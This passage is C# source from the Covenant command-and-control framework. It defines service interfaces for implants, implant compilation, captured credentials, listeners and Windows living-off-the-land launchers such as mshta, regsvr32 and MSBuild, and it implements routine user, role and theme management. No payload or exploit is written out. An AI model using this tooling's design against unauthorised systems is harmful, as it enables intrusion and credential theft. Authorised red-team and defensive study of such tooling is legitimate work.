// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Claims;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Text.RegularExpressions;

using Microsoft.Extensions.Configuration;
using Microsoft.EntityFrameworkCore;
using Microsoft.AspNetCore.Identity;
using Microsoft.CodeAnalysis;

using Encrypt = Covenant.Core.Encryption;
using Covenant.Models;
using Covenant.Models.Covenant;
using Covenant.Models.Listeners;
using Covenant.Models.Launchers;
using Covenant.Models.Grunts;
using Covenant.Models.Indicators;

namespace Covenant.Core
{
    public interface ICovenantUserService
    {
        Task<IEnumerable<CovenantUser>> GetUsers();
        Task<CovenantUser> GetUser(string userId);
        Task<CovenantUser> GetUserByUsername(string username);
        Task<CovenantUser> GetCurrentUser(ClaimsPrincipal principal);
        Task<CovenantUserLoginResult> Login(CovenantUserLogin login);
        Task<CovenantUser> CreateUserVerify(ClaimsPrincipal principal, CovenantUserRegister register);
        Task<CovenantUser> CreateUser(CovenantUserLogin login);
        Task<CovenantUser> EditUser(CovenantUser currentUser);
        Task<CovenantUser> EditUserPassword(CovenantUser currentUser, CovenantUserLogin user);
        Task DeleteUser(string userId);
    }

    public interface IIdentityRoleService
    {
        Task<IEnumerable<IdentityRole>> GetRoles();
        Task<IdentityRole> GetRole(string roleId);
        Task<IdentityRole> GetRoleByName(string rolename);
    }

    public interface IIdentityUserRoleService
    {
        Task<IEnumerable<IdentityUserRole<string>>> GetUserRoles();
        Task<IEnumerable<IdentityUserRole<string>>> GetUserRolesForUser(string userId);
        Task<IdentityUserRole<string>> GetUserRole(string userId, string roleId);
        Task<IdentityUserRole<string>> CreateUserRole(string userId, string roleId);
        Task DeleteUserRole(string userId, string roleId);
    }

    public interface IThemeService
    {
        Task<IEnumerable<Theme>> GetThemes();
        Task<Theme> GetTheme(int id);
        Task<Theme> CreateTheme(Theme theme);
        Task<Theme> EditTheme(Theme theme);
        Task DeleteTheme(int id);
    }

    public interface IEventService
    {
        Task<IEnumerable<Event>> GetEvents();
        Task<Event> GetEvent(int eventId);
        Task<long> GetEventTime();
        Task<IEnumerable<Event>> GetEventsAfter(long fromdate);
        Task<IEnumerable<Event>> GetEventsRange(long fromdate, long todate);
        Task<Event> CreateEvent(Event anEvent);
        Task<IEnumerable<Event>> CreateEvents(params Event[] events);
        Task<IEnumerable<DownloadEvent>> GetDownloadEvents();
        Task<DownloadEvent> GetDownloadEvent(int eventId);
        Task<string> GetDownloadContent(int eventId);
        Task<DownloadEvent> CreateDownloadEvent(DownloadEvent downloadEvent);
        Task<IEnumerable<ScreenshotEvent>> GetScreenshotEvents();
        Task<ScreenshotEvent> GetScreenshotEvent(int eventId);
        Task<string> GetScreenshotContent(int eventId);
        Task<ScreenshotEvent> CreateScreenshotEvent(ScreenshotEvent screenshotEvent);
    }

    public interface IImplantTemplateService
    {
        Task<IEnumerable<ImplantTemplate>> GetImplantTemplates();
        Task<ImplantTemplate> GetImplantTemplate(int id);
        Task<ImplantTemplate> GetImplantTemplateByName(string name);
        Task<ImplantTemplate> CreateImplantTemplate(ImplantTemplate template);
        Task<IEnumerable<ImplantTemplate>> CreateImplantTemplates(params ImplantTemplate[] templates);
        Task<ImplantTemplate> EditImplantTemplate(ImplantTemplate template);
        Task DeleteImplantTemplate(int id);
    }

    public interface IGruntService
    {
        Task<IEnumerable<Grunt>> GetGrunts();
        Task<Grunt> GetGrunt(int gruntId);
        Task<Grunt> GetGruntByName(string name);
        Task<Grunt> GetGruntByGUID(string guid);
        Task<Grunt> GetGruntByOriginalServerGUID(string serverguid);
        Task<bool> IsGruntLost(Grunt g);
        Task<List<string>> GetPathToChildGrunt(int gruntId, int childId);
        Task<Grunt> GetOutboundGrunt(int gruntId);
        Task<Grunt> CreateGrunt(Grunt grunt);
        Task<IEnumerable<Grunt>> CreateGrunts(params Grunt[] grunts);
        Task<Grunt> EditGrunt(Grunt grunt, CovenantUser user);
        Task DeleteGrunt(int gruntId);
        Task<List<string>> GetCommandSuggestionsForGrunt(Grunt grunt);
        Task<byte[]> CompileGruntStagerCode(int id, Launcher launcher);
        Task<byte[]> CompileGruntExecutorCode(int id, OutputKind outputKind = OutputKind.DynamicallyLinkedLibrary, bool Compress = false);
        Task<GruntCommand> InteractGrunt(int GruntId, string UserId, string UserInput);
    }

    public interface IReferenceAssemblyService
    {
        Task<IEnumerable<ReferenceAssembly>> GetReferenceAssemblies();
        Task<IEnumerable<ReferenceAssembly>> GetDefaultNet35ReferenceAssemblies();
        Task<IEnumerable<ReferenceAssembly>> GetDefaultNet40ReferenceAssemblies();
        Task<ReferenceAssembly> GetReferenceAssembly(int id);
        Task<ReferenceAssembly> GetReferenceAssemblyByName(string name, Common.DotNetVersion version);
        Task<ReferenceAssembly> CreateReferenceAssembly(ReferenceAssembly assembly);
        Task<IEnumerable<ReferenceAssembly>> CreateReferenceAssemblies(params ReferenceAssembly[] assemblies);
        Task<ReferenceAssembly> EditReferenceAssembly(ReferenceAssembly assembly);
        Task DeleteReferenceAssembly(int id);
    }

    public interface IEmbeddedResourceService
    {
        Task<IEnumerable<EmbeddedResource>> GetEmbeddedResources();
        Task<EmbeddedResource> GetEmbeddedResource(int id);
        Task<EmbeddedResource> GetEmbeddedResourceByName(string name);
        Task<EmbeddedResource> CreateEmbeddedResource(EmbeddedResource resource);
        Task<IEnumerable<EmbeddedResource>> CreateEmbeddedResources(params EmbeddedResource[] resources);
        Task<EmbeddedResource> EditEmbeddedResource(EmbeddedResource resource);
        Task DeleteEmbeddedResource(int id);
    }

    public interface IReferenceSourceLibraryService
    {
        Task<IEnumerable<ReferenceSourceLibrary>> GetReferenceSourceLibraries();
        Task<ReferenceSourceLibrary> GetReferenceSourceLibrary(int id);
        Task<ReferenceSourceLibrary> GetReferenceSourceLibraryByName(string name);
        Task<ReferenceSourceLibrary> CreateReferenceSourceLibrary(ReferenceSourceLibrary library);
        Task<IEnumerable<ReferenceSourceLibrary>> CreateReferenceSourceLibraries(params ReferenceSourceLibrary[] libraries);
        Task<ReferenceSourceLibrary> EditReferenceSourceLibrary(ReferenceSourceLibrary library);
        Task DeleteReferenceSourceLibrary(int id);
    }

    public interface IGruntTaskOptionService
    {
        Task<GruntTaskOption> EditGruntTaskOption(GruntTaskOption option);
        Task<GruntTaskOption> CreateGruntTaskOption(GruntTaskOption option);
        Task<IEnumerable<GruntTaskOption>> CreateGruntTaskOptions(params GruntTaskOption[] options);
    }

    public interface IGruntTaskAuthorService
    {
        Task<IEnumerable<GruntTaskAuthor>> GetGruntTaskAuthors();
        Task<GruntTaskAuthor> GetGruntTaskAuthor(int id);
        Task<GruntTaskAuthor> GetGruntTaskAuthorByName(string Name);
        Task<GruntTaskAuthor> CreateGruntTaskAuthor(GruntTaskAuthor author);
        Task<GruntTaskAuthor> EditGruntTaskAuthor(GruntTaskAuthor author);
    }

    public interface IGruntTaskService : IReferenceAssemblyService, IEmbeddedResourceService, IReferenceSourceLibraryService,
        IGruntTaskOptionService, IGruntTaskAuthorService
    {
        Task<IEnumerable<GruntTask>> GetGruntTasks();
        Task<IEnumerable<GruntTask>> GetGruntTasksForGrunt(int gruntId);
        Task<GruntTask> GetGruntTask(int id);
        Task<GruntTask> GetGruntTaskByName(string name, Common.DotNetVersion version = Common.DotNetVersion.Net35);
        Task<GruntTask> CreateGruntTask(GruntTask task);
        Task<IEnumerable<GruntTask>> CreateGruntTasks(params GruntTask[] tasks);
        Task<GruntTask> EditGruntTask(GruntTask task);
        Task DeleteGruntTask(int taskId);
        Task<string> ParseParametersIntoTask(GruntTask task, List<ParsedParameter> parameters);
    }

    public interface IGruntCommandService
    {
        Task<IEnumerable<GruntCommand>> GetGruntCommands();
        Task<IEnumerable<GruntCommand>> GetGruntCommandsForGrunt(int gruntId);
        Task<GruntCommand> GetGruntCommand(int id);
        Task<GruntCommand> CreateGruntCommand(GruntCommand command);
        Task<IEnumerable<GruntCommand>> CreateGruntCommands(params GruntCommand[] commands);
        Task<GruntCommand> EditGruntCommand(GruntCommand command);
        Task DeleteGruntCommand(int id);
    }

    public interface ICommandOutputService
    {
        Task<IEnumerable<CommandOutput>> GetCommandOutputs();
        Task<CommandOutput> GetCommandOutput(int commandOutputId);
        Task<CommandOutput> CreateCommandOutput(CommandOutput output);
        Task<IEnumerable<CommandOutput>> CreateCommandOutputs(params CommandOutput[] outputs);
        Task<CommandOutput> EditCommandOutput(CommandOutput output);
        Task DeleteCommandOutput(int id);
    }

    public interface IGruntTaskingService
    {
        Task<IEnumerable<GruntTasking>> GetGruntTaskings();
        Task<IEnumerable<GruntTasking>> GetGruntTaskingsForGrunt(int gruntId);
        Task<IEnumerable<GruntTasking>> GetUninitializedGruntTaskingsForGrunt(int gruntId);
        Task<IEnumerable<GruntTasking>> GetGruntTaskingsSearch(int gruntId);
        Task<GruntTasking> GetGruntTasking(int taskingId);
        Task<GruntTasking> GetGruntTaskingByName(string taskingName);
        Task<GruntTasking> CreateGruntTasking(GruntTasking tasking);
        Task<IEnumerable<GruntTasking>> CreateGruntTaskings(params GruntTasking[] taskings);
        Task<GruntTasking> EditGruntTasking(GruntTasking tasking);
        Task DeleteGruntTasking(int taskingId);
    }

    public interface ICredentialService
    {
        Task<IEnumerable<CapturedCredential>> GetCredentials();
        Task<IEnumerable<CapturedPasswordCredential>> GetPasswordCredentials();
        Task<IEnumerable<CapturedHashCredential>> GetHashCredentials();
        Task<IEnumerable<CapturedTicketCredential>> GetTicketCredentials();
        Task<CapturedCredential> GetCredential(int credentialId);
        Task<CapturedPasswordCredential> GetPasswordCredential(int credentialId);
        Task<CapturedHashCredential> GetHashCredential(int credentialId);
        Task<CapturedTicketCredential> GetTicketCredential(int credentialId);
        Task<CapturedPasswordCredential> CreatePasswordCredential(CapturedPasswordCredential credential);
        Task<CapturedHashCredential> CreateHashCredential(CapturedHashCredential credential);
        Task<CapturedTicketCredential> CreateTicketCredential(CapturedTicketCredential credential);
        Task<IEnumerable<CapturedCredential>> CreateCredentials(params CapturedCredential[] credentials);
        Task<CapturedPasswordCredential> EditPasswordCredential(CapturedPasswordCredential credential);
        Task<CapturedHashCredential> EditHashCredential(CapturedHashCredential credential);
        Task<CapturedTicketCredential> EditTicketCredential(CapturedTicketCredential credential);
        Task DeleteCredential(int credentialId);
    }

    public interface IIndicatorService
    {
        Task<IEnumerable<Indicator>> GetIndicators();
        Task<IEnumerable<FileIndicator>> GetFileIndicators();
        Task<IEnumerable<NetworkIndicator>> GetNetworkIndicators();
        Task<IEnumerable<TargetIndicator>> GetTargetIndicators();
        Task<Indicator> GetIndicator(int indicatorId);
        Task<FileIndicator> GetFileIndicator(int indicatorId);
        Task<NetworkIndicator> GetNetworkIndicator(int indicatorId);
        Task<TargetIndicator> GetTargetIndicator(int indicatorId);
        Task<Indicator> CreateIndicator(Indicator indicator);
        Task<IEnumerable<Indicator>> CreateIndicators(params Indicator[] indicators);
        Task<Indicator> EditIndicator(Indicator indicator);
        Task DeleteIndicator(int indicatorId);
    }

    public interface IListenerTypeService
    {
        Task<IEnumerable<ListenerType>> GetListenerTypes();
        Task<ListenerType> GetListenerType(int listenerTypeId);
        Task<ListenerType> GetListenerTypeByName(string name);
    }

    public interface IListenerService : IListenerTypeService
    {
        Task<IEnumerable<Listener>> GetListeners();
        Task<Listener> GetListener(int listenerId);
        Task<Listener> EditListener(Listener listener);
        Task StartListener(int listenerId);
        Task DeleteListener(int listenerId);
        Task<IEnumerable<HttpListener>> GetHttpListeners();
        Task<IEnumerable<BridgeListener>> GetBridgeListeners();
        Task<HttpListener> GetHttpListener(int listenerId);
        Task<BridgeListener> GetBridgeListener(int listenerId);
        Task<HttpListener> CreateHttpListener(HttpListener listener);
        Task<BridgeListener> CreateBridgeListener(BridgeListener listener);
        Task<IEnumerable<Listener>> CreateListeners(params Listener[] entities);
        Task<HttpListener> EditHttpListener(HttpListener listener);
        Task<BridgeListener> EditBridgeListener(BridgeListener listener);
    }

    public interface IProfileService
    {
        Task<IEnumerable<Profile>> GetProfiles();
        Task<Profile> GetProfile(int profileId);
        Task<Profile> CreateProfile(Profile profile, CovenantUser currentUser);
        Task<Profile> EditProfile(Profile profile, CovenantUser currentUser);
        Task DeleteProfile(int id);
        Task<IEnumerable<HttpProfile>> GetHttpProfiles();
        Task<IEnumerable<BridgeProfile>> GetBridgeProfiles();
        Task<HttpProfile> GetHttpProfile(int profileId);
        Task<BridgeProfile> GetBridgeProfile(int profileId);
        Task<HttpProfile> CreateHttpProfile(HttpProfile profile, CovenantUser currentUser);
        Task<BridgeProfile> CreateBridgeProfile(BridgeProfile profile, CovenantUser currentUser);
        Task<IEnumerable<Profile>> CreateProfiles(params Profile[] profiles);
        Task<HttpProfile> EditHttpProfile(HttpProfile profile, CovenantUser currentUser);
        Task<BridgeProfile> EditBridgeProfile(BridgeProfile profile, CovenantUser currentUser);
    }

    public interface IHostedFileService
    {
        Task<IEnumerable<HostedFile>> GetHostedFiles();
        Task<HostedFile> GetHostedFile(int hostedFileId);
        Task<IEnumerable<HostedFile>> GetHostedFilesForListener(int listenerId);
        Task<HostedFile> GetHostedFileForListener(int listenerId, int hostedFileId);
        Task<HostedFile> CreateHostedFile(HostedFile file);
        Task<IEnumerable<HostedFile>> CreateHostedFiles(params HostedFile[] files);
        Task<HostedFile> EditHostedFile(int listenerId, HostedFile file);
        Task DeleteHostedFile(int listenerId, int hostedFileId);
    }

    public interface ILauncherService
    {
        Task<IEnumerable<Launcher>> GetLaunchers();
        Task<Launcher> GetLauncher(int id);
        Task<BinaryLauncher> GetBinaryLauncher();
        Task<BinaryLauncher> GenerateBinaryLauncher();
        Task<BinaryLauncher> GenerateBinaryHostedLauncher(HostedFile file);
        Task<BinaryLauncher> EditBinaryLauncher(BinaryLauncher launcher);
        Task<ShellCodeLauncher> GetShellCodeLauncher();
        Task<ShellCodeLauncher> GenerateShellCodeLauncher();
        Task<ShellCodeLauncher> GenerateShellCodeHostedLauncher(HostedFile file);
        Task<ShellCodeLauncher> EditShellCodeLauncher(ShellCodeLauncher launcher);
        Task<PowerShellLauncher> GetPowerShellLauncher();
        Task<PowerShellLauncher> GeneratePowerShellLauncher();
        Task<PowerShellLauncher> GeneratePowerShellHostedLauncher(HostedFile file);
        Task<PowerShellLauncher> EditPowerShellLauncher(PowerShellLauncher launcher);
        Task<MSBuildLauncher> GetMSBuildLauncher();
        Task<MSBuildLauncher> GenerateMSBuildLauncher();
        Task<MSBuildLauncher> GenerateMSBuildHostedLauncher(HostedFile file);
        Task<MSBuildLauncher> EditMSBuildLauncher(MSBuildLauncher launcher);
        Task<InstallUtilLauncher> GetInstallUtilLauncher();
        Task<InstallUtilLauncher> GenerateInstallUtilLauncher();
        Task<InstallUtilLauncher> GenerateInstallUtilHostedLauncher(HostedFile file);
        Task<InstallUtilLauncher> EditInstallUtilLauncher(InstallUtilLauncher launcher);
        Task<WmicLauncher> GetWmicLauncher();
        Task<WmicLauncher> GenerateWmicLauncher();
        Task<WmicLauncher> GenerateWmicHostedLauncher(HostedFile file);
        Task<WmicLauncher> EditWmicLauncher(WmicLauncher launcher);
        Task<Regsvr32Launcher> GetRegsvr32Launcher();
        Task<Regsvr32Launcher> GenerateRegsvr32Launcher();
        Task<Regsvr32Launcher> GenerateRegsvr32HostedLauncher(HostedFile file);
        Task<Regsvr32Launcher> EditRegsvr32Launcher(Regsvr32Launcher launcher);
        Task<MshtaLauncher> GetMshtaLauncher();
        Task<MshtaLauncher> GenerateMshtaLauncher();
        Task<MshtaLauncher> GenerateMshtaHostedLauncher(HostedFile file);
        Task<MshtaLauncher> EditMshtaLauncher(MshtaLauncher launcher);
        Task<CscriptLauncher> GetCscriptLauncher();
        Task<CscriptLauncher> GenerateCscriptLauncher();
        Task<CscriptLauncher> GenerateCscriptHostedLauncher(HostedFile file);
        Task<CscriptLauncher> EditCscriptLauncher(CscriptLauncher launcher);
        Task<WscriptLauncher> GetWscriptLauncher();
        Task<WscriptLauncher> GenerateWscriptLauncher();
        Task<WscriptLauncher> GenerateWscriptHostedLauncher(HostedFile file);
        Task<WscriptLauncher> EditWscriptLauncher(WscriptLauncher launcher);
    }

    public interface ICovenantService : ICovenantUserService, IIdentityRoleService, IIdentityUserRoleService, IThemeService,
        IEventService, IImplantTemplateService, IGruntService, IGruntTaskService,
        IGruntCommandService, ICommandOutputService, IGruntTaskingService,
        ICredentialService, IIndicatorService, IListenerService, IProfileService, IHostedFileService, ILauncherService
    {
        Task<IEnumerable<T>> CreateEntities<T>(params T[] entities);
        void DisposeContext();
    }

    public interface IRemoteCovenantService : ICovenantUserService, IIdentityRoleService, IIdentityUserRoleService, IThemeService,
        IEventService, IImplantTemplateService, IGruntService, IGruntTaskService,
        IGruntCommandService, ICommandOutputService, IGruntTaskingService,
        ICredentialService, IIndicatorService, IListenerService, IProfileService, IHostedFileService, ILauncherService
    {

    }


    public class CovenantService : ICovenantService
    {
        protected readonly DbContextOptions<CovenantContext> _options;
        protected CovenantContext _context;
        protected readonly INotificationService _notifier;
        protected readonly UserManager<CovenantUser> _userManager;
        protected readonly SignInManager<CovenantUser> _signInManager;
        protected readonly IConfiguration _configuration;
        protected readonly ConcurrentDictionary<int, CancellationTokenSource> _cancellationTokens;

        public CovenantService(DbContextOptions<CovenantContext> options, CovenantContext context, INotificationService notifier,
            UserManager<CovenantUser> userManager, SignInManager<CovenantUser> signInManager,
            IConfiguration configuration, ConcurrentDictionary<int, CancellationTokenSource> cancellationTokens)
        {
            _options = options;
            _context = context;
            _notifier = notifier;
            _userManager = userManager;
            _signInManager = signInManager;
            _configuration = configuration;
            _cancellationTokens = cancellationTokens;
        }

        public void DisposeContext()
        {
            _context.Dispose();
            _context = new CovenantContext(_options);
        }

        public async Task<IEnumerable<T>> CreateEntities<T>(params T[] entities)
        {
            foreach (T entity in entities)
            {
                await _context.AddAsync(entity);
            }
            await _context.SaveChangesAsync();
            return entities;
        }

        #region CovenantUser Actions
        public async Task<IEnumerable<CovenantUser>> GetUsers()
        {
            return await _context.Users
                .Include(U => U.Theme)
                .ToListAsync();
        }

        public async Task<CovenantUser> GetUser(string userId)
        {
            CovenantUser user = await _context.Users
                .Include(U => U.Theme)
                .FirstOrDefaultAsync(U => U.Id == userId);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - CovenantUser with id: {userId}");
            }
            return user;
        }

        public async Task<CovenantUser> GetUserByUsername(string username)
        {
            CovenantUser user = await _context.Users
                .Include(U => U.Theme)
                .FirstOrDefaultAsync(U => U.UserName == username);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - CovenantUser with Username: {username}");
            }
            return user;
        }

        public async Task<CovenantUser> GetCurrentUser(ClaimsPrincipal principal)
        {
            CovenantUser user = await _userManager.GetUserAsync(principal);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not identify current username");
            }
            return await this.GetUser(user.Id);
        }

        public async Task<CovenantUserLoginResult> Login(CovenantUserLogin login)
        {
            SignInResult result = await _signInManager.PasswordSignInAsync(login.UserName, login.Password, false, false);
            if (!result.Succeeded)
            {
                return new CovenantUserLoginResult { Success = false, CovenantToken = "" };
            }
            CovenantUser user = await _context.Users
                .Include(U => U.Theme)
                .FirstOrDefaultAsync(U => U.UserName == login.UserName);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - User with username: {login.UserName}");
            }
            List<string> userRoles = await _context.UserRoles.Where(UR => UR.UserId == user.Id).Select(UR => UR.RoleId).ToListAsync();
            List<string> roles = await _context.Roles.Where(R => userRoles.Contains(R.Id)).Select(R => R.Name).ToListAsync();

            string token = Utilities.GenerateJwtToken(
                login.UserName, user.Id, roles.ToArray(),
                _configuration["JwtKey"], _configuration["JwtIssuer"],
                _configuration["JwtAudience"], _configuration["JwtExpireDays"]
            );
            return new CovenantUserLoginResult { Success = true, CovenantToken = token };
        }

        public async Task<CovenantUser> CreateUserVerify(ClaimsPrincipal principal, CovenantUserRegister register)
        {
            if (_userManager.Users.Any() && !principal.Identity.IsAuthenticated)
            {
                throw new ControllerUnauthorizedException($"Unauthorized - Must be signed in to register a new user.");
            }
            if (_userManager.Users.Any() && !principal.IsInRole("Administrator"))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - Must be signed in as an Administrator to register a new user.");
            }
            if (register.Password != register.ConfirmPassword)
            {
                throw new ControllerBadRequestException($"BadRequest - Password does not match ConfirmPassword.");
            }
            CovenantUser created = await CreateUser(new CovenantUserLogin { UserName = register.UserName, Password = register.Password });
            await _userManager.AddToRoleAsync(created, "User");
            if (!_userManager.Users.Any())
            {
                await _signInManager.PasswordSignInAsync(register.UserName, register.Password, true, lockoutOnFailure: false);
            }
            // _notifier.OnCreateCovenantUser?.Invoke(this, created);
            return created;
        }

        public async Task<CovenantUser> CreateUser(CovenantUserLogin login)
        {
            CovenantUser user = new CovenantUser { UserName = login.UserName };
            IdentityResult userResult = await _userManager.CreateAsync(user, login.Password);
            if (!userResult.Succeeded)
            {
                List<IdentityError> errors = userResult.Errors.ToList();
                string ErrorMessage = $"BadRequest - Could not create CovenantUser: {user.UserName}";
                foreach (IdentityError error in userResult.Errors)
                {
                    ErrorMessage += Environment.NewLine + error.Description;
                }
                throw new ControllerBadRequestException(ErrorMessage);
            }

            if (!_userManager.Users.Any())
            {
                await _userManager.AddToRoleAsync(user, "Administrator");
            }

            CovenantUser savedUser = await _userManager.Users.FirstOrDefaultAsync(U => U.UserName == user.UserName);
            if (savedUser == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find CovenantUser with username: {user.UserName}");
            }
            string savedRoles = String.Join(",", await this.GetUserRolesForUser(savedUser.Id));

            DateTime eventTime = DateTime.UtcNow;
            Event userEvent = new Event
            {
                Time = eventTime,
                MessageHeader = "Created User",
                MessageBody = "User: " + savedUser.UserName + " with roles: " + savedRoles + " has been created!",
                Level = EventLevel.Info,
                Context = "Users"
            };
            await _context.Events.AddAsync(userEvent);
            // _notifier.OnCreateCovenantUser(this, savedUser);
            await _notifier.NotifyCreateEvent(this, userEvent);
            return savedUser;
        }

        public async Task<CovenantUser> EditUser(CovenantUser user)
        {
            CovenantUser matching_user = await _userManager.Users.FirstOrDefaultAsync(U => U.Id == user.Id);
            if (matching_user == null)
            {
                throw new ControllerNotFoundException($"NotFound - CovenantUser with id: {user.Id}");
            }
            matching_user.ThemeId = user.ThemeId;
            IdentityResult result = await _userManager.UpdateAsync(matching_user);
            if (!result.Succeeded)
            {
                throw new ControllerBadRequestException($"BadRequest - Could not edit CovenantUser with id: {user.Id}");
            }
            // await _context.SaveChangesAsync();
            await _notifier.NotifyEditCovenantUser(this, matching_user);
            return matching_user;
        }

        public async Task<CovenantUser> EditUserPassword(CovenantUser currentUser, CovenantUserLogin user)
        {
            CovenantUser matching_user = await _userManager.Users.FirstOrDefaultAsync(U => U.UserName == user.UserName);
            if (matching_user == null)
            {
                throw new ControllerNotFoundException($"NotFound - CovenantUser with username: {user.UserName}");
            }
            if (currentUser.UserName != matching_user.UserName)
            {
                throw new ControllerBadRequestException($"BadRequest - Current user: {currentUser.UserName} cannot change password of user: {user.Password}");
            }
            matching_user.PasswordHash = _userManager.PasswordHasher.HashPassword(matching_user, user.Password);
            IdentityResult result = await _userManager.UpdateAsync(matching_user);
            if (!result.Succeeded)
            {
                throw new ControllerBadRequestException($"BadRequest - Could not set new password for CovenantUser with username: {user.UserName}");
            }
            // await _context.SaveChangesAsync();
            await _notifier.NotifyEditCovenantUser(this, matching_user);
            return matching_user;
        }

        public async Task DeleteUser(string userId)
        {
            CovenantUser user = await this.GetUser(userId);
            if (await this.IsAdmin(user) && this.GetAdminCount() == 1)
            {
                string ErrorMessage = $"BadRequest - Could not delete CovenantUser with id: {userId}";
                ErrorMessage += "Can't delete the last Administrative user.";
                throw new ControllerBadRequestException(ErrorMessage);
            }
            _context.Users.Remove(user);
            await _context.SaveChangesAsync();
            await _notifier.NotifyDeleteCovenantUser(this, user.Id);
        }

        private IQueryable<CovenantUser> GetAdminUsers()
        {
            return from users in _context.Users
                   join userroles in _context.UserRoles on users.Id equals userroles.UserId
                   join roles in _context.Roles on userroles.RoleId equals roles.Id
                   where roles.Name == "Administrator"
                   select users;
        }

        private async Task<bool> IsAdmin(CovenantUser user)
        {
            return await GetAdminUsers().Select(U => U.UserName).ContainsAsync(user.UserName);
        }

        private int GetAdminCount()
        {
            return GetAdminUsers().Count();
        }
        #endregion

        #region Role Actions
        public async Task<IEnumerable<IdentityRole>> GetRoles()
        {
            return await _context.Roles.ToListAsync();
        }

        public async Task<IdentityRole> GetRole(string roleId)
        {
            IdentityRole role = await _context.Roles.FirstOrDefaultAsync(R => R.Id == roleId);
            if (role == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find Role with id: {roleId}");
            }
            return role;
        }

        public async Task<IdentityRole> GetRoleByName(string rolename)
        {
            IdentityRole role = await _context.Roles.FirstOrDefaultAsync(R => R.Name == rolename);
            if (role == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find Role with name: {rolename}");
            }
            return role;
        }
        #endregion

        #region UserRole Actions
        public async Task<IEnumerable<IdentityUserRole<string>>> GetUserRoles()
        {
            return await _context.UserRoles.ToListAsync();
        }

        public async Task<IEnumerable<IdentityUserRole<string>>> GetUserRolesForUser(string userId)
        {
            return await _context.UserRoles.Where(UR => UR.UserId == userId).ToListAsync();
        }

        public async Task<IdentityUserRole<string>> GetUserRole(string userId, string roleId)
        {
            IdentityUserRole<string> userRole = await _context.UserRoles.FirstOrDefaultAsync(UR => UR.UserId == userId && UR.RoleId == roleId);
            if (userRole == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find UserRole with user id: {userId} and role id: {roleId}");
            }
            return userRole;
        }

        public async Task<IdentityUserRole<string>> CreateUserRole(string userId, string roleId)
        {
            CovenantUser user = await _userManager.Users.FirstOrDefaultAsync(U => U.Id == userId);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - CovenantUser with id: {userId}");
            }
            IdentityRole role = await this.GetRole(roleId);
            IdentityUserRole<string> userRole = new IdentityUserRole<string>
            {
                UserId = user.Id,
                RoleId = role.Id
            };
            IdentityResult result = await _userManager.AddToRoleAsync(user, role.Name);
            if (!result.Succeeded)
            {
                string Errors = $"BadRequest - Could not add CovenantUser: {user.UserName} to role: {role.Name}";
                foreach (var error in result.Errors)
                {
                    Errors += $"{Environment.NewLine}{error.Description} ({error.Code})";
                }
                throw new ControllerBadRequestException(Errors);
            }
            // _notifier.OnCreateIdentityUserRole(this, userRole);
            return userRole;
        }

        public async Task DeleteUserRole(string userId, string roleId)
        {
            CovenantUser user = await this.GetUser(userId);
            IdentityRole role = await this.GetRole(roleId);
            IdentityRole adminRole = await this.GetRoleByName("Administrator");
            if (role == adminRole && _context.UserRoles.Where(UR => UR.RoleId == adminRole.Id).Count() == 1)
            {
                string ErrorMessage = $"BadRequest - Could not remove CovenantUser with id: {userId} from Administrative role";
                ErrorMessage += "Can't remove the last Administrative user.";
                throw new ControllerBadRequestException(ErrorMessage);
            }
            IdentityUserRole<string> userRole = new IdentityUserRole<string>
            {
                UserId = user.Id,
                RoleId = role.Id
            };
            var entry = _context.UserRoles.Remove(userRole);
            if (entry.State != EntityState.Deleted)
            {
                throw new ControllerBadRequestException($"BadRequest - Could not remove role: {role.Name} from CovenantUser: {user.UserName}");
            }
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteIdentityUserRole(this, new Tuple<string, string>(user.Id, role.Id));
        }
        #endregion

        #region Theme Actions
        public async Task<IEnumerable<Theme>> GetThemes()
        {
            return await _context.Themes.ToListAsync();
        }

        public async Task<Theme> GetTheme(int themeId)
        {
            Theme theme = await _context.Themes.FirstOrDefaultAsync(T => T.Id == themeId);
            if (theme == null)
            {
                throw new ControllerNotFoundException($"NotFound - Theme with id: {themeId}");
            }
            return theme;
        }

        public async Task<Theme> CreateTheme(Theme theme)
        {
            await _context.Themes.AddAsync(theme);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateTheme(this, theme);
            return await this.GetTheme(theme.Id);
        }

        public async Task<Theme> EditTheme(Theme theme)
        {
            Theme matchingTheme = await this.GetTheme(theme.Id);
            matchingTheme.Description = theme.Description;
            matchingTheme.Name = theme.Name;

            matchingTheme.BackgroundColor = theme.BackgroundColor;
            matchingTheme.BackgroundTextColor = theme.BackgroundTextColor;

            matchingTheme.PrimaryColor = theme.PrimaryColor;
            matchingTheme.PrimaryTextColor = theme.PrimaryTextColor;
            matchingTheme.PrimaryHighlightColor = theme.PrimaryHighlightColor;

            matchingTheme.SecondaryColor = theme.SecondaryColor;
            matchingTheme.SecondaryTextColor = theme.SecondaryTextColor;
            matchingTheme.SecondaryHighlightColor = theme.SecondaryHighlightColor;

            matchingTheme.TerminalColor = theme.TerminalColor;
            matchingTheme.TerminalTextColor = theme.TerminalTextColor;
            matchingTheme.TerminalHighlightColor = theme.TerminalHighlightColor;
            matchingTheme.TerminalBorderColor = theme.TerminalBorderColor;

            matchingTheme.NavbarColor = theme.NavbarColor;
            matchingTheme.SidebarColor = theme.SidebarColor;

            matchingTheme.InputColor = theme.InputColor;
            matchingTheme.InputDisabledColor = theme.InputDisabledColor;
            matchingTheme.InputTextColor = theme.InputTextColor;
            matchingTheme.InputHighlightColor = theme.InputHighlightColor;

            matchingTheme.TextLinksColor = theme.TextLinksColor;

            matchingTheme.CodeMirrorTheme = theme.CodeMirrorTheme;
            _context.Themes.Update(matchingTheme);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditTheme(this, matchingTheme);
            return await this.GetTheme(theme.Id);
        }

